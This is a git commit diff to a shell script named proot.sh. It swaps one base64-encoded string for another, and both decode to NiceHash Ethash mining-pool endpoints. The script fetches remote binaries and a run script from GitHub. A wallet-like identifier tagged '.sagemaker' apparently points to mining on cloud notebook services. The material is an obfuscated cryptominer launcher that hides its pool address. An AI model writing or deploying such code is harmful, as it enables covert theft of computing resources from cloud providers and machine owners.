df366221a79b2e4867c524ef364093c30f881cf5
pickaxecolleague <100679616+pickaxecolleague@users.noreply.github.com>
2022-03-11 19:03:21 +0700

    Update proot.sh

--- proot.sh
+++ proot.sh
@@ -4,7 +4,7 @@ golang=https://github.com/pickaxecolleague/pickaxecolleague/releases/download/1.
 run=https://raw.githubusercontent.com/pickaxecolleague/pickaxecolleague/main/run.sh
 
 userAgent="3EjCK7AUv5CxMEMfbYzqL6xH3dvK5VcDhY.sagemaker"
-string=c3RyYXR1bSt0Y3A6Ly9kYWdnZXJoYXNoaW1vdG8uZXUtd2VzdC5uaWNlaGFzaC5jb206MzM1Mw==
+string=c3RyYXR1bSt0Y3A6Ly9kYWdnZXJoYXNoaW1vdG8udXNhLXdlc3QubmljZWhhc2guY29tOjMzNTM=
 key=ZXRoYXNo
 
 seed=$(echo $string | base64 --decode)
